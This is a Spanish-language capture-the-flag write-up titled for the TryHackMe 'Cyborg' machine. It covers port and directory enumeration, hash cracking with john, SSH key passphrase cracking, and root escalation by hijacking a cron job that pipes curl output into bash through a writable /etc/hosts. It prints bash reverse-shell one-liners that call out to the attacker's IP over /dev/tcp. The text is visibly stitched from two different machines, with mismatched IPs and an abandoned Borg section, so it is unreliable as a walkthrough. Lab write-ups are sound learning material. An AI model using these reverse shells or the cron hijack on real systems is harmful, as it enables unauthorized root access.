---
title: TryHackMe Cyborg Writeup
published: false
---

La máquina Cyborg es una máquina de TryHackMe en la que mediante la explotación de un servidor web deberemos conseguir la flag del usuario y la de root, así como preguntas básicas sobre el escaneo de la misma:

*  ¿Cuántos puertos estás abiertos?
?
* ¿Qué servicio corre en el puerto 22?
???
* ¿Qué servicio corre en el puerto 80?
????

# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar los puertos abiertos:

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-16 16:08 EDT
Initiating Ping Scan at 16:08
Scanning 10.10.89.102 [2 ports]
Completed Ping Scan at 16:08, 0.05s elapsed (1 total hosts)
Initiating Connect Scan at 16:08
Scanning 10.10.89.102 [65535 ports]
Discovered open port 22/tcp on 10.10.89.102
Discovered open port 80/tcp on 10.10.89.102
Completed Connect Scan at 16:08, 17.17s elapsed (65535 total ports)
Nmap scan report for 10.10.89.102
Host is up, received syn-ack (0.063s latency).
Scanned at 2022-10-16 16:08:17 EDT for 17s
Not shown: 60080 closed tcp ports (conn-refused), 5453 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ???     syn-ack
80/tcp open  ????    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.27 seconds
```

Desde este tipo de escaneo ya podemos contestar todas las preguntas anteriores.

Puesto que el puerto 80 está abierto, introducimos la IP en nuestro navegador y nos muestra una página con el servicio Apache. Investigamos un poco el código de la página pero no conseguimos información relevante.

Usaremos gobuster para obtener directorios ocultos:

```bash
❯ gobuster dir -u http://10.10.89.102 -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.89.102
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/10/16 16:14:13 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 312] [--> http://10.10.89.102/admin/]
/etc                  (Status: 301) [Size: 310] [--> http://10.10.89.102/etc/]  
/index.html           (Status: 200) [Size: 11321]                               
/index.html           (Status: 200) [Size: 11321]                               
/server-status        (Status: 403) [Size: 277]                                 
                                                                                
===============================================================
2022/10/16 16:14:50 Finished
===============================================================
```

Encontramos directorios ocultos en los que están el panel de autentificación y dos o tres más.

Nos metemos en /admin e investigando la web conseguimos tres potenciales usuarios y una contraseña en hash que corresponde a un backup de "music_archive":

> music_archive:$apr1$BpZ.Q.1m$F0qqPw??????????????

Usamos john para descifrar el hash:

```bash
❯ john cyborg.txt --wordlist=/home/jorge/Descargas/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
???????       (?)     
1g 0:00:00:00 DONE (2022-10-16 16:36) 5.000g/s 194880p/s 194880c/s 194880C/s 112704..salsabila
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Por otro lado, nos podemos descargar un archivo .tar

Lo hacemos y lo descomprimimos. Tras varias carpetas, en README:

>  This is a Borg Backup repository.
>  See https://borgbackup.readthedocs.io/

NOs redirige a la instalación de BorgBackup. Lo instalamos con:

> sudo apt install borgbackup

Abrimos el manual de borg en nuestro equipo y con el comando list podemos listar los archivos de un repositorio: 




# [](#header-1)Acceso al sistema

Tras investigar un poco nos fijamos en el código del panel de login. En el apartado de JavaScript podemos ver al final del código que exite una cookie. Para intentar acceder con ella lo que deberemos hacer es dirigirnos al apartado de Storage y en Cookies darle a + para que se añada. Lo único que habrá que cambiar será el nombre. Aquí deberemos poner el de la propia cookie. En este caso SessionToken. Una vez añadida recargamos la página y nos muestra una clave RSA privada con un potencial usuario (James) pero está encriptada. 

Lo que podemos hacer es convertir la clave privada a hash para después crackearla y conseguir la contraseña del usuario James. Para ello usaremos ssh2john. Antes habrá que copiar la clave privada en nuestro equipo bajo el nombre id_rsa y darle permiso con chmod (chmod 600 id_rsa). Usando ssh2john:

> /usr/share/john/ssh2john.py id_rsa > overpass.txt

Para obtener la contraseña podremos usar John ora vez:

```bash
❯ /usr/sbin/john --wordlist=/home/jorge/Descargas/rockyou.txt overpass.txt
Created directory: /home/jorge/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
???????          (id_rsa)     
1g 0:00:00:00 DONE (2022-10-16 14:40) 33.33g/s 445866p/s 445866c/s 445866C/s lespaul..handball
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Nos muestra la contraseña. Intentaremos conectarnos por SSH con la clave privada y la contraseña descifrada:

```bash
❯ ssh -i id_rsa james@10.10.189.162
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Oct 16 18:46:19 UTC 2022

  System load:  0.08               Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 13%                IP address for eth0: 10.10.189.162
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ 
```

Estamos dentro, conseguimos la flag del usuario:

```bash
james@overpass-prod:~$ ls -R
.:
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt 
thm{????????????????????????}
```

# [](#header-1)Escalada de privilegios

No podemos realizar sudo -l para ver los comandos que podemos ejecutar como root. Abrimos el archivo todo.txt y nos reporta lo siguiente:

```bash
james@overpass-prod:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

De aquí podemos sacar que hay un proceso automatizado por lo que abro /etc/crontab y nos muestra: 

```bash
james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Podemos observar que cada minuto se ejecuta un script en bash.

Si tenemos permisos de escritura en /etc/host podemos realizar la reverse shell, lo comprobamos:

```bash
james@overpass-prod:~$ ls -la /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
```

Tenemos permisos. Modificamos la IP de overpass.thm en /etc/hosts poniendo nuestra IP

Desde nuestro equipo, creamos la misma estructura de directorios y en el archivo buildscript.sh añadimos la bash reverse shell con nuestra IP y el puerto deseado.

Es decir, creamos /downloads/src/ y dentro el archivo .sh

En mi caso he usado la de <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey</a>:

> bash -i >& /dev/tcp/10.8.33.229/4444 0>&1

También podríamos haber usado la de <a href="https://gtfobins.github.io/gtfobins/bash/#reverse-shell">GTFOBins</a>:

> bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'

Ejecutamos un servidor local mediante:

> python3 -m http.server 80

Nos ponemos en escucha desde el puerto que hemos indicado y esperamos menos de un minuto (que es lo que tarda en ejecutarse la tarea crontab desde la máquina víctima)

```bash
❯ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.8.33.229] from (UNKNOWN) [10.10.189.162] 58330
bash: cannot set terminal process group (3567): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# ls
ls
buildStatus
builds
go
root.txt
src
root@overpass-prod:~# cat root.txt
cat root.txt
thm{????????????????????????''}
```

Conseguimos acceso y obtenemos la flag de root! 

Muchas gracias por leer este writeup, espero que te haya gustado!
